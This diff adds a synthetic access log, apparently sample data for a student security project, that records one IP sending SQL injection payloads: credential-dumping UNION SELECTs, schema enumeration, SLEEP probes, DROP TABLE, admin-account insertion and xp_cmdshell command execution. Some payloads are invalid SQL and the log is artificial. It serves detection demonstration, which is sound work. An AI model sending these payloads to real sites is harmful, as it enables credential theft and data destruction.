@@ -1,0 +1,37 @@
+# SQL Injection Attack Log Sample
+# Generated for Shield-Source FYP demonstration
+# This log demonstrates an SQL Injection attack pattern
+
+192.168.10.55 - - [09/Jul/2026:14:00:01 +0000] "GET /login.php?id=1 HTTP/1.1" 200 512
+192.168.10.55 - - [09/Jul/2026:14:00:02 +0000] "GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 128
+192.168.10.55 - - [09/Jul/2026:14:00:03 +0000] "GET /search.php?q=' OR '1'='1 HTTP/1.1" 200 4096
+192.168.10.55 - - [09/Jul/2026:14:00:04 +0000] "GET /user.php?id=1; DROP TABLE users-- HTTP/1.1" 500 64
+192.168.10.55 - - [09/Jul/2026:14:00:05 +0000] "POST /login.php HTTP/1.1" 401 128
+192.168.10.55 - - [09/Jul/2026:14:00:06 +0000] "GET /admin.php?id=1 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1" 500 256
+192.168.10.55 - - [09/Jul/2026:14:00:07 +0000] "GET /item.php?id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects)) HTTP/1.1" 500 128
+192.168.10.55 - - [09/Jul/2026:14:00:08 +0000] "GET /product.php?cat=1 UNION SELECT null,null,CONCAT(username,0x3a,password) FROM users-- HTTP/1.1" 200 8192
+192.168.10.55 - - [09/Jul/2026:14:00:09 +0000] "GET /news.php?id=1 AND SLEEP(5)-- HTTP/1.1" 200 256
+192.168.10.55 - - [09/Jul/2026:14:00:10 +0000] "GET /page.php?id=1' UNION SELECT 1,group_concat(username,':',password) FROM users-- HTTP/1.1" 500 128
+ERROR: Unhandled SQL exception in database query handler
+ERROR: MySQL syntax error near 'UNION SELECT' at line 1
+192.168.10.55 - - [09/Jul/2026:14:00:11 +0000] "GET /view.php?id=1 EXEC xp_cmdshell('whoami')-- HTTP/1.1" 500 64
+192.168.10.55 - - [09/Jul/2026:14:00:12 +0000] "GET /data.php?id=1 UNION SELECT CHAR(65,66,67) FROM users-- HTTP/1.1" 200 512
+192.168.10.55 - - [09/Jul/2026:14:00:13 +0000] "GET /search.php?q=1 UNION SELECT table_name,column_name FROM information_schema.columns-- HTTP/1.1" 500 256
+192.168.10.55 - - [09/Jul/2026:14:00:14 +0000] "GET /products.php?id=1 INSERT INTO admins VALUES('hacker','pwned')-- HTTP/1.1" 500 64
+ERROR: Critical: Database write attempt from unauthorized source detected
+192.168.10.55 - - [09/Jul/2026:14:00:15 +0000] "GET /api.php?filter=1 UNION SELECT DELETE FROM sessions-- HTTP/1.1" 500 128
+192.168.10.55 - - [09/Jul/2026:14:00:16 +0000] "GET /users.php?sort=name UNION SELECT UPDATE users SET password='cracked'-- HTTP/1.1" 403 64
+192.168.10.55 - - [09/Jul/2026:14:00:17 +0000] "GET /report.php?id=1 UNION SELECT CAST(username AS varchar) FROM users-- HTTP/1.1" 500 256
+192.168.10.55 - - [09/Jul/2026:14:00:18 +0000] "GET /detail.php?id=1 UNION SELECT CONVERT(password, CHAR) FROM admins-- HTTP/1.1" 200 1024
+ERROR: Fatal: Possible data exfiltration attempt logged from 192.168.10.55
+192.168.10.55 - - [09/Jul/2026:14:00:19 +0000] "GET /index.php?id=1 UNION SELECT 1,2,3,4-- HTTP/1.1" 500 64
+192.168.10.55 - - [09/Jul/2026:14:00:20 +0000] "GET /view.php?q=SELECT * FROM users WHERE 1=1-- HTTP/1.1" 500 256
+192.168.10.55 - - [09/Jul/2026:14:00:21 +0000] "GET /admin.php?id=1 OR '1'='1 UNION SELECT * FROM credentials-- HTTP/1.1" 401 64
+192.168.10.55 - - [09/Jul/2026:14:00:22 +0000] "GET /api/users?filter=' UNION SELECT username,email,password FROM users-- HTTP/1.1" 500 512
+192.168.10.55 - - [09/Jul/2026:14:00:23 +0000] "GET /search?q=test UNION SELECT null,null,null,CONCAT(0x71627171,ifnull(cast(version() as char),0x20))-- HTTP/1.1" 500 256
+ERROR: Exception: java.sql.SQLException: You have an error in your SQL syntax
+192.168.10.55 - - [09/Jul/2026:14:00:24 +0000] "GET /login?user=admin'-- HTTP/1.1" 200 4096
+192.168.10.55 - - [09/Jul/2026:14:00:25 +0000] "GET /page.php?id=1 UNION SELECT EXEC('net user')-- HTTP/1.1" 500 64
+192.168.10.55 - - [09/Jul/2026:14:00:26 +0000] "GET /list.php?cat=1 UNION ALL SELECT NULL,NULL,NULL-- HTTP/1.1" 500 128
+192.168.10.55 - - [09/Jul/2026:14:00:27 +0000] "GET /item.php?id=1;SELECT+SLEEP(5)-- HTTP/1.1" 200 512
+192.168.10.55 - - [09/Jul/2026:14:00:28 +0000] "GET /data.php?id=1 OR 1=1-- HTTP/1.1" 200 8192
